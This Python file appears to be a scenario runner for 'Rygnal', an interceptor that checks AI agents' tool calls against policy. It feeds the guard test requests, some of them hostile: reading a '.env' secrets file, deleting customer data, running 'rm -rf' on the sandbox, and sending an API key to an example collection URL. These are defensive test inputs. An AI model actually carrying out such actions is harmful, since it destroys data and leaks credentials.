"""Real scenario runner for Rygnal Core."""

from __future__ import annotations

from dataclasses import dataclass
from pathlib import Path
from typing import Any

from demo.demo_tools import build_demo_tool_executor, prepare_demo_sandbox
from rygnal.audit_logger import AuditLogger
from rygnal.interceptor import RygnalInterceptor
from rygnal.models import InterceptorResult, ToolRequest
from rygnal.policy_engine import load_default_policy_engine
from rygnal.risk_engine import RiskEngine


@dataclass(frozen=True)
class Scenario:
    """A realistic security workflow scenario."""

    name: str
    description: str
    request: ToolRequest


@dataclass(frozen=True)
class ScenarioOutcome:
    """A completed scenario result."""

    scenario: Scenario
    result: InterceptorResult


class ScenarioRunner:
    """Run realistic Rygnal workflows inside a controlled local sandbox."""

    def __init__(
        self,
        sandbox_path: str | Path = "demo_sandbox",
        audit_log_path: str | Path = "logs/audit_log.jsonl",
    ) -> None:
        self.sandbox_path = Path(sandbox_path)
        self.audit_log_path = Path(audit_log_path)

    def build_interceptor(self) -> RygnalInterceptor:
        """Build a Rygnal interceptor for scenario execution."""
        prepare_demo_sandbox(self.sandbox_path)

        return RygnalInterceptor(
            policy_engine=load_default_policy_engine(),
            audit_logger=AuditLogger(self.audit_log_path),
            tool_executor=build_demo_tool_executor(self.sandbox_path),
            risk_engine=RiskEngine(),
        )

    def scenarios(self) -> list[Scenario]:
        """Return the real workflow scenarios for v1."""
        return [
            Scenario(
                name="safe-file-read",
                description="Agent reads safe project documentation.",
                request=ToolRequest(
                    tool_name="file_read",
                    action="read_file",
                    target="README.md",
                ),
            ),
            Scenario(
                name="secret-file-access",
                description="Agent attempts to read environment secrets.",
                request=ToolRequest(
                    tool_name="file_read",
                    action="read_file",
                    target=".env",
                ),
            ),
            Scenario(
                name="file-delete-approval",
                description="Agent attempts to delete customer data.",
                request=ToolRequest(
                    tool_name="file_delete",
                    action="delete_file",
                    target="customer_data.csv",
                ),
            ),
            Scenario(
                name="safe-shell-command",
                description="Agent runs an allowlisted shell command.",
                request=ToolRequest(
                    tool_name="shell_command",
                    action="execute",
                    input="ls",
                ),
            ),
            Scenario(
                name="dangerous-shell-command",
                description="Agent attempts a destructive shell command.",
                request=ToolRequest(
                    tool_name="shell_command",
                    action="execute",
                    input="rm -rf demo_sandbox",
                ),
            ),
            Scenario(
                name="external-secret-send",
                description="Agent attempts to send secret data externally.",
                request=ToolRequest(
                    tool_name="external_api_send",
                    action="send_data",
                    input={
                        "url": "https://example.com/collect",
                        "payload": "api_key=sk-demo-secret-value",
                    },
                ),
            ),
            Scenario(
                name="safe-file-write",
                description="Agent writes safe project notes inside sandbox.",
                request=ToolRequest(
                    tool_name="file_write",
                    action="write_file",
                    target="project_notes.txt",
                    input="Updated by Rygnal scenario runner.\n",
                ),
            ),
        ]

    def run_all(self) -> list[ScenarioOutcome]:
        """Run all scenarios through the Rygnal interceptor."""
        interceptor = self.build_interceptor()
        outcomes: list[ScenarioOutcome] = []

        for scenario in self.scenarios():
            result = interceptor.intercept(scenario.request)
            outcomes.append(ScenarioOutcome(scenario=scenario, result=result))

        return outcomes


def format_outcome(outcome: ScenarioOutcome) -> str:
    """Format one scenario outcome for CLI output."""
    result = outcome.result
    risk = normalize_risk(result.risk_assessment)

    decision = value_of(result.policy_decision.decision)
    execution_status = value_of(result.execution.status)
    risk_level = risk.get("risk_level", "unknown")
    risk_score = risk.get("risk_score", "n/a")

    return (
        f"[{outcome.scenario.name}] "
        f"decision={decision} "
        f"risk={risk_level}/{risk_score} "
        f"execution={execution_status} "
        f"audit_event={result.audit_event.event_id}"
    )


def normalize_risk(risk_assessment: Any) -> dict[str, Any]:
    """Normalize risk assessment from dict or Pydantic model."""
    if isinstance(risk_assessment, dict):
        return risk_assessment

    if hasattr(risk_assessment, "model_dump"):
        return risk_assessment.model_dump(mode="json")

    return {}


def value_of(value: Any) -> str:
    """Return enum value or string."""
    return str(getattr(value, "value", value))
